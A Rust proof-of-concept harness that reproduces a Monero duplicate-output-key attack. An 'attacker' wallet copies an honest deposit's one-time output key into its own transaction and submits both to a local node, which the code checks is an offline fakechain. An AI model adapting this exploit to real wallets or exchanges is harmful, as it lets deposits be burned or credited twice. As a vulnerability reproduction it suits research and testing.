use monero_wallet::{Scanner,ViewPair,WalletOutput,OutputWithDecoys,
 ed25519::{Point,Scalar,CompressedPoint},address::Network,block::Block,
 interface::{ScannableBlock,FeeRate},transaction::{Transaction,Pruned},
 ringct::{RctType,clsag::Decoys},send::{SignableTransaction,Change},extra::Extra};
use curve25519_dalek::{constants::ED25519_BASEPOINT_POINT as G,scalar::Scalar as CS};
use rand_core::{OsRng,RngCore};
use zeroize::Zeroizing;
use serde_json::{Value,json};
use std::{net::TcpStream,io::{Read,Write},time::Duration};
fn hex(b:&[u8])->String {b.iter().map(|x|format!("{x:02x}")).collect()}
fn unhex(s:&str)->Vec<u8>{assert!(s.len()%2==0);s.as_bytes().chunks_exact(2).map(|p|u8::from_str_radix(std::str::from_utf8(p).unwrap(),16).unwrap()).collect()}
fn num(v:&Value,k:&str)->u64{v[k].as_u64().unwrap()}
fn strv<'a>(v:&'a Value,k:&str)->&'a str{v[k].as_str().unwrap()}
fn dig(s:&str)->[u8;32]{unhex(s).try_into().unwrap()}
struct Rpc {port:u16,genesis:Option<[u8;32]>}
fn absent_result(r:&Value,id:[u8;32]){assert_eq!(r["status"],"OK");if let Some(rows)=r.get("txs"){assert!(rows.as_array().unwrap().is_empty(),"honest candidate must be absent from chain and pool");}assert_eq!(r["missed_tx"],json!([hex(&id)]));}
impl Rpc{
 fn call(&self,path:&str,payload:Value)->Value {
  // All mutating calls are gated here, even if a caller bypasses mine/submit.
  let mutable=if path=="/json_rpc"{let method=strv(&payload,"method");assert!(["get_info","hard_fork_info","get_block","get_block_header_by_height","get_fee_estimate","generateblocks"].contains(&method));method=="generateblocks"}
    else{assert!(["/get_transactions","/get_outs","/send_raw_transaction"].contains(&path));path=="/send_raw_transaction"};
  if mutable{assert!(self.genesis.is_some(),"mutation requires pinned fakechain genesis");self.check();}
  let body=serde_json::to_vec(&payload).unwrap();let mut s=TcpStream::connect(("127.0.0.1",self.port)).unwrap();
  s.set_read_timeout(Some(Duration::from_secs(45))).unwrap();
  write!(s,"POST {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",body.len()).unwrap();
  s.write_all(&body).unwrap();let mut raw=vec![];s.take(4_000_001).read_to_end(&mut raw).unwrap();assert!(raw.len()<=4_000_000);
  let split=raw.windows(4).position(|x|x==b"\r\n\r\n").unwrap();let header=std::str::from_utf8(&raw[..split]).unwrap();assert!(header.starts_with("HTTP/1.1 200 ")||header.starts_with("HTTP/1.0 200 "));
  let v:Value=serde_json::from_slice(&raw[split+4..]).unwrap();assert!(v.get("error").is_none(),"{v}");v.get("result").cloned().unwrap_or(v)
 }
 fn json(&self,m:&str,p:Value)->Value{self.call("/json_rpc",json!({"jsonrpc":"2.0","id":"fixture","method":m,"params":p}))}
 fn check(&self)->u64{let v=self.json("get_info",json!({}));assert_eq!(v["status"],"OK");assert_eq!(v["nettype"],"fakechain");assert_eq!(v["offline"],true);for k in ["mainnet","testnet","stagenet"]{assert_eq!(v[k],false);}for k in ["incoming_connections_count","outgoing_connections_count"]{assert_eq!(v[k],0);}assert_eq!(self.json("hard_fork_info",json!({}))["version"],16);if let Some(genesis)=self.genesis{let header=self.json("get_block_header_by_height",json!({"height":0}));assert_eq!(header["status"],"OK");assert_eq!(dig(strv(&header["block_header"],"hash")),genesis);}num(&v,"height")}
 fn mine(&self,v:&ViewPair,n:u64){assert!(n>0&&n<=60);self.check();let r=self.json("generateblocks",json!({"wallet_address":v.legacy_address(Network::Mainnet).to_string(),"amount_of_blocks":n}));assert_eq!(r["status"],"OK");assert_eq!(r["blocks"].as_array().unwrap().len(),n as usize);}
 fn tx(&self,id:[u8;32])->Value{let r=self.call("/get_transactions",json!({"txs_hashes":[hex(&id)],"decode_as_json":false,"prune":false}));assert_eq!(r["status"],"OK");let rows=r["txs"].as_array().unwrap();assert_eq!(rows.len(),1);assert_eq!(dig(strv(&rows[0],"tx_hash")),id);assert_eq!(rows[0]["in_pool"],false);rows[0].clone()}
 fn absent(&self,id:[u8;32]){let r=self.call("/get_transactions",json!({"txs_hashes":[hex(&id)],"decode_as_json":false,"prune":false}));absent_result(&r,id);}
 fn block(&self,h:u64)->ScannableBlock{
  self.check();let v=self.json("get_block",json!({"height":h}));assert_eq!(v["status"],"OK");let blob=unhex(strv(&v,"blob"));let mut read=blob.as_slice();let b=Block::read(&mut read).unwrap();assert!(read.is_empty());assert_eq!(b.hash(),dig(strv(&v["block_header"],"hash")));assert_eq!(num(&v["block_header"],"height"),h);assert_eq!(v["block_header"]["orphan_status"],false);assert_eq!(b.header.hardfork_version,if h==0{1}else{16});
  // Genesis has a V1 miner transaction and no RingCT global output index.
  // It is read only for chain identity and raw-key counting, never as funding.
  if h==0{assert_eq!(b.miner_transaction().version(),1);assert!(b.transactions.is_empty());return ScannableBlock{block:b,transactions:vec![],output_index_for_first_ringct_output:None};}
  let miner=self.tx(b.miner_transaction().hash());let first=miner["output_indices"][0].as_u64().unwrap();let mut transactions=vec![];
  for id in &b.transactions{let row=self.tx(*id);assert_eq!(num(&row,"block_height"),h);let bytes=unhex(strv(&row,"as_hex"));let tx=Transaction::read(&mut bytes.as_slice()).unwrap();assert_eq!(tx.hash(),*id);transactions.push(Transaction::<Pruned>::from(tx));}
  ScannableBlock{block:b,transactions,output_index_for_first_ringct_output:Some(first)}
 }
 fn ring(&self,o:&WalletOutput,indices:&[u64])->OutputWithDecoys{
  assert_eq!(indices.len(),16);let r=self.call("/get_outs",json!({"outputs":indices.iter().map(|i|json!({"amount":0,"index":i})).collect::<Vec<_>>(),"get_txid":true}));assert_eq!(r["status"],"OK");let rows=r["outs"].as_array().unwrap();assert_eq!(rows.len(),16);
  let height=self.check();let real=indices.iter().position(|i|*i==o.index_on_blockchain()).unwrap();let mut points=vec![];
  for row in rows{assert_eq!(row["unlocked"],true);assert!(num(row,"height")+60<=height);points.push([CompressedPoint::from(dig(strv(row,"key"))).decompress().unwrap(),CompressedPoint::from(dig(strv(row,"mask"))).decompress().unwrap()]);}
  assert_eq!(points[real],[o.key(),o.commitment().commit()]);assert_eq!(dig(strv(&rows[real],"txid")),o.transaction());
  let mut offsets=vec![indices[0]];offsets.extend(indices.windows(2).map(|w|w[1]-w[0]));let decoys=Decoys::new(offsets,real as u8,points).unwrap();
  let mut bytes=o.key().compress().to_bytes().to_vec();o.key_offset().write(&mut bytes).unwrap();o.commitment().write(&mut bytes).unwrap();decoys.write(&mut bytes).unwrap();OutputWithDecoys::read(&mut bytes.as_slice()).unwrap()
 }
 fn submit(&self,t:&Transaction)->Value{self.check();self.call("/send_raw_transaction",json!({"tx_as_hex":hex(&t.serialize()),"do_not_relay":false}))}
}
fn wallet(secret:&Scalar)->ViewPair{ViewPair::new(Point::from(G*(*secret).into()),Zeroizing::new(Scalar::from(CS::ONE))).unwrap()}
fn clear(){for name in ["COPY_RAW_P","COPY_PUBLIC_R","COPY_VAULT_B"]{std::env::remove_var(name);}}
fn construct(rpc:&Rpc,view:&ViewPair,secret:&Scalar,o:&WalletOutput,indices:&[u64],vault:&ViewPair,fee:FeeRate,amount:u64)->Transaction{
 let mut seed=Zeroizing::new([0;32]);OsRng.fill_bytes(&mut *seed);
 SignableTransaction::new(RctType::ClsagBulletproofPlus,seed,vec![rpc.ring(o,indices)],vec![(vault.legacy_address(Network::Testnet),amount)],Change::new(view.clone(),None),vec![],fee).unwrap().sign(&mut OsRng,&Zeroizing::new(*secret)).unwrap()
}
// Copier receives only public transaction bytes, public vault B/view information,
// and its own funded input/secret. It has no honest sender r or vault spend secret.
fn copy_tx(rpc:&Rpc,public_honest:&Transaction,attacker:&ViewPair,attacker_secret:&Scalar,o:&WalletOutput,indices:&[u64],public_vault:&ViewPair,fee:FeeRate,mode:&str,target_index:usize,amount:u64)->Transaction{
 clear();
 let p=public_honest.prefix().outputs[target_index].key.to_bytes();
 if mode=="raw"{std::env::set_var("COPY_RAW_P",hex(&p));std::env::set_var("COPY_VAULT_B",hex(&public_vault.spend().compress().to_bytes()));}
 else{let extra=Extra::read(&mut public_honest.prefix().extra.as_slice()).unwrap();let(keys,additional)=extra.keys().unwrap();assert_eq!(keys.len(),1);assert!(additional.is_none());std::env::set_var("COPY_PUBLIC_R",hex(&keys[0].compress().to_bytes()));}
 let tx=(0..100).find_map(|_|{let tx=construct(rpc,attacker,attacker_secret,o,indices,public_vault,fee,amount);(tx.prefix().outputs.get(target_index).map(|o|o.key.to_bytes())==Some(p)).then_some(tx)}).expect("same index construction");clear();tx
}
// This entry accepts public data only. Funding and the single spend use a newly
// generated copier scalar; the vault is a view-only B + scalar-ONE descriptor.
fn copy_existing(file:&str,prepared:bool){
 clear();let bytes=std::fs::read(file).unwrap();assert!(!bytes.is_empty()&&bytes.len()<=1_000_000);let input:Value=serde_json::from_slice(&bytes).unwrap();
 let object=input.as_object().unwrap();let mut keys=object.keys().map(String::as_str).collect::<Vec<_>>();keys.sort_unstable();assert_eq!(keys,["mode","outputIndex","port","txHex","txid","vaultSpend"]);
 let mode=strv(&input,"mode");assert!(["raw","decodable"].contains(&mode));let port:u16=num(&input,"port").try_into().unwrap();assert_ne!(port,0);
 let raw=unhex(strv(&input,"txHex"));assert!(!raw.is_empty()&&raw.len()<=400_000);let mut cursor=raw.as_slice();let honest=Transaction::read(&mut cursor).unwrap();assert!(cursor.is_empty());assert_eq!(honest.serialize(),raw);let honest_id=dig(strv(&input,"txid"));assert_eq!(honest.hash(),honest_id);
 let index:usize=num(&input,"outputIndex").try_into().unwrap();assert!(index<honest.prefix().outputs.len()&&index<2,"fixed two-output fixture");let p=honest.prefix().outputs[index].key.to_bytes();
 let vault=ViewPair::new(CompressedPoint::from(dig(strv(&input,"vaultSpend"))).decompress().unwrap(),Zeroizing::new(Scalar::from(CS::ONE))).unwrap();
 let mut rpc=Rpc{port,genesis:None};let initial_height=rpc.check();let genesis=rpc.block(0).block.hash();rpc.genesis=Some(genesis);rpc.check();
 let (honest_block,honest_height)=if prepared{
  rpc.absent(honest_id);
  // This container decodes public candidate output data only. Its synthetic
  // positions are never reported or accepted as canonical deposit indices.
  let mut container=rpc.block(initial_height.checked_sub(1).unwrap());container.block.transactions=vec![honest_id];container.transactions=vec![Transaction::<Pruned>::from(honest.clone())];(container,None)
 }else{let row=rpc.tx(honest_id);assert_eq!(unhex(strv(&row,"as_hex")),raw);let height=num(&row,"block_height");let block=rpc.block(height);assert!(block.block.transactions.contains(&honest_id));(block,Some(height))};
 let admitted=Scanner::new(vault.clone()).scan(honest_block).unwrap().not_additionally_locked().into_iter().filter(|o|o.transaction()==honest_id&&o.index_in_transaction()==index as u64&&o.key().compress().to_bytes()==p).collect::<Vec<_>>();assert_eq!(admitted.len(),1);let amount=admitted[0].commitment().amount;assert!(amount>0);
 let own_secret=Zeroizing::new(Scalar::random(&mut OsRng));let own=wallet(&own_secret);let start=rpc.check();rpc.mine(&own,18);rpc.mine(&own,60);let funded_height=rpc.check();
 let mut scanner=Scanner::new(own.clone());let funds=(start..start+18).flat_map(|h|scanner.scan(rpc.block(h)).unwrap().additional_timelock_satisfied_by(funded_height as usize,0)).collect::<Vec<_>>();assert_eq!(funds.len(),18);
 let indices=funds.iter().take(16).map(WalletOutput::index_on_blockchain).collect::<Vec<_>>();let estimate=rpc.json("get_fee_estimate",json!({"grace_blocks":10}));let fee=FeeRate::new(num(&estimate,"fee"),num(&estimate,"quantization_mask")).unwrap();
 let copy=copy_tx(&rpc,&honest,&own,&own_secret,&funds[0],&indices,&vault,fee,mode,index,amount);assert_ne!(copy.hash(),honest_id);assert_eq!(copy.prefix().outputs[index].key.to_bytes(),p);
 if prepared{rpc.absent(honest_id);}let copy_height=rpc.check();let reply=rpc.submit(&copy);assert_eq!(reply["status"],"OK","{reply}");rpc.mine(&own,1);let copy_block=rpc.block(copy_height);assert!(copy_block.block.transactions.contains(&copy.hash()));let copy_block_hash=copy_block.block.hash();
 let decoded=Scanner::new(vault.clone()).scan(copy_block).unwrap().not_additionally_locked().into_iter().filter(|o|o.transaction()==copy.hash()).collect::<Vec<_>>();assert_eq!(decoded.len(),usize::from(mode=="decodable"));if let Some(o)=decoded.first(){assert_eq!(o.key().compress().to_bytes(),p);assert_eq!(o.commitment().amount,amount);}
 let final_height=rpc.check();let mut occurrences=0usize;for h in 0..final_height{let block=rpc.block(h);occurrences+=block.block.miner_transaction().prefix().outputs.iter().filter(|o|o.key.to_bytes()==p).count();for tx in block.transactions{occurrences+=tx.prefix().outputs.iter().filter(|o|o.key.to_bytes()==p).count();}}
 assert_eq!(rpc.check(),final_height);if prepared{assert_eq!(occurrences,1);rpc.absent(honest_id);}else{assert!(occurrences>=2);assert_eq!(unhex(strv(&rpc.tx(honest_id),"as_hex")),raw);}
 println!("{}",json!({"operation":if prepared{"copy-prepared-public-deposit"}else{"copy-existing-public-deposit"},"mode":mode,"genesis":hex(&genesis),"initialHeight":initial_height,"honestTx":hex(&honest_id),"honestHeight":honest_height,"honestOutputIndex":index,"honestChainIndex":if prepared{None}else{Some(admitted[0].index_on_blockchain())},"honestDecodedAtomic":amount.to_string(),"copyTx":hex(&copy.hash()),"copyHeight":copy_height,"copyBlockHash":hex(&copy_block_hash),"outputKey":hex(&p),"rawOccurrences":occurrences,"copyDecodedOutputs":decoded.len(),"copyDecodedAtomic":decoded.first().map(|o|o.commitment().amount.to_string()),"copySubmission":reply,"finalHeight":final_height}));
}
fn main(){
 let args=std::env::args().collect::<Vec<_>>();assert_eq!(args.len(),3,"copy-existing|copy-prepared <public-input.json> OR <raw|decodable> <honest-first|copy-first>");if ["copy-existing","copy-prepared"].contains(&args[1].as_str()){copy_existing(&args[2],args[1]=="copy-prepared");return;}let mode=&args[1];let order=&args[2];assert!(["raw","decodable"].contains(&mode.as_str()));assert!(["honest-first","copy-first"].contains(&order.as_str()));clear();
 let mut rpc=Rpc{port:std::env::var("MONERO_LOCAL_RPC_PORT").unwrap().parse().unwrap(),genesis:None};let start=rpc.check();let genesis=rpc.block(0).block.hash();rpc.genesis=Some(genesis);
 let honest_secret=Zeroizing::new(Scalar::random(&mut OsRng));let attacker_secret=Zeroizing::new(Scalar::random(&mut OsRng));let vault_secret=Zeroizing::new(Scalar::random(&mut OsRng));let honest=wallet(&honest_secret);let attacker=wallet(&attacker_secret);let vault=wallet(&vault_secret);
 rpc.mine(&honest,18);rpc.mine(&attacker,18);rpc.mine(&honest,60);let height=rpc.check();
 let scan_range=|v:ViewPair,s:u64|{let mut scanner=Scanner::new(v);(s..s+18).flat_map(|n|scanner.scan(rpc.block(n)).unwrap().additional_timelock_satisfied_by(height as usize,0)).collect::<Vec<_>>()};
 let h_outputs=scan_range(honest.clone(),start);let a_outputs=scan_range(attacker.clone(),start+18);assert_eq!(h_outputs.len(),18);assert_eq!(a_outputs.len(),18);
 let h_indices=h_outputs.iter().take(16).map(WalletOutput::index_on_blockchain).collect::<Vec<_>>();let a_indices=a_outputs.iter().take(16).map(WalletOutput::index_on_blockchain).collect::<Vec<_>>();
 let estimate=rpc.json("get_fee_estimate",json!({"grace_blocks":10}));let fee=FeeRate::new(num(&estimate,"fee"),num(&estimate,"quantization_mask")).unwrap();
 let honest_tx=construct(&rpc,&honest,&honest_secret,&h_outputs[0],&h_indices,&vault,fee,100_000_000_000);
 // Local candidate container is for identifying the honest output before broadcast.
 let mut container=rpc.block(start);container.block.transactions=vec![honest_tx.hash()];container.transactions=vec![Transaction::<Pruned>::from(honest_tx.clone())];
 let selected=Scanner::new(vault.clone()).scan(container).unwrap().not_additionally_locked();let selected=selected.into_iter().filter(|o|o.transaction()==honest_tx.hash()).collect::<Vec<_>>();assert_eq!(selected.len(),1);let target_index=selected[0].index_in_transaction() as usize;
 let copy=copy_tx(&rpc,&honest_tx,&attacker,&attacker_secret,&a_outputs[0],&a_indices,&vault,fee,mode,target_index,100_000_000_000);
 let output_key=honest_tx.prefix().outputs[target_index].key.to_bytes();assert_ne!(honest_tx.hash(),copy.hash());assert_eq!(copy.prefix().outputs[target_index].key.to_bytes(),output_key);
 let first=if order=="honest-first"{&honest_tx}else{&copy};let second=if order=="honest-first"{&copy}else{&honest_tx};
 let first_height=rpc.check();let first_reply=rpc.submit(first);assert_eq!(first_reply["status"],"OK","{first_reply}");rpc.mine(&honest,1);let second_height=rpc.check();let second_reply=rpc.submit(second);assert_eq!(second_reply["status"],"OK","{second_reply}");rpc.mine(&honest,1);rpc.mine(&honest,60);
 let h_height=if order=="honest-first"{first_height}else{second_height};let c_height=if order=="honest-first"{second_height}else{first_height};
 let hblock=rpc.block(h_height);let cblock=rpc.block(c_height);assert!(hblock.block.transactions.contains(&honest_tx.hash()));assert!(cblock.block.transactions.contains(&copy.hash()));
 let hscan=Scanner::new(vault.clone()).scan(hblock.clone()).unwrap().not_additionally_locked().into_iter().filter(|o|o.transaction()==honest_tx.hash()).collect::<Vec<_>>();assert_eq!(hscan.len(),1);let honest_output=&hscan[0];assert_eq!(honest_output.commitment().amount,100_000_000_000);assert_eq!(honest_output.key().compress().to_bytes(),output_key);
 let cscan=Scanner::new(vault.clone()).scan(cblock.clone()).unwrap().not_additionally_locked().into_iter().filter(|o|o.transaction()==copy.hash()).collect::<Vec<_>>();assert_eq!(cscan.len(),usize::from(mode=="decodable"));
 let mut occurrences=0;for n in start..rpc.check(){let b=rpc.block(n);occurrences+=b.block.miner_transaction().prefix().outputs.iter().filter(|o|o.key.to_bytes()==output_key).count();for tx in b.transactions{occurrences+=tx.prefix().outputs.iter().filter(|o|o.key.to_bytes()==output_key).count();}}assert_eq!(occurrences,2);
 let mut spend_indices=h_indices[..15].to_vec();spend_indices.push(honest_output.index_on_blockchain());spend_indices.sort_unstable();
 let spend=construct(&rpc,&vault,&vault_secret,honest_output,&spend_indices,&honest,fee,90_000_000_000);let spend_height=rpc.check();let spend_reply=rpc.submit(&spend);assert_eq!(spend_reply["status"],"OK","{spend_reply}");rpc.mine(&honest,1);assert!(rpc.block(spend_height).block.transactions.contains(&spend.hash()));assert_eq!(rpc.block(0).block.hash(),genesis);
 println!("{}",json!({"mode":mode,"ordering":order,"genesis":hex(&genesis),"honestTx":hex(&honest_tx.hash()),"copyTx":hex(&copy.hash()),"outputKey":hex(&output_key),"honestOutputIndex":target_index,"honestChainIndex":honest_output.index_on_blockchain(),"honestHeight":h_height,"copyHeight":c_height,"rawOccurrences":occurrences,"honestDecodedOutputs":hscan.len(),"copyDecodedOutputs":cscan.len(),"copyDecodedAtomic":cscan.first().map(|o|o.commitment().amount.to_string()),"firstSubmission":first_reply,"secondSubmission":second_reply,"specificallySelectedHonestSpendTx":hex(&spend.hash()),"honestSpendSubmission":spend_reply,"honestSpendCanonicalHeight":spend_height,"finalHeight":rpc.check(),"privateRExported":false}));
}
#[cfg(test)]mod tests{
 use super::*;
 #[test]fn omitted_empty_transactions_still_requires_exact_missing_id(){
  let id=[0x11;32];let good=json!({"status":"OK","missed_tx":[hex(&id)]});absent_result(&good,id);
  let mut empty=good.clone();empty["txs"]=json!([]);absent_result(&empty,id);
  for(field,value)in [("txs",json!([{"in_pool":true}])),("txs",Value::Null),("missed_tx",json!([])),("missed_tx",json!(["22".repeat(32)])),("status",json!("BUSY"))]{
   let mut bad=good.clone();bad[field]=value;assert!(std::panic::catch_unwind(||absent_result(&bad,id)).is_err());
  }
 }
}
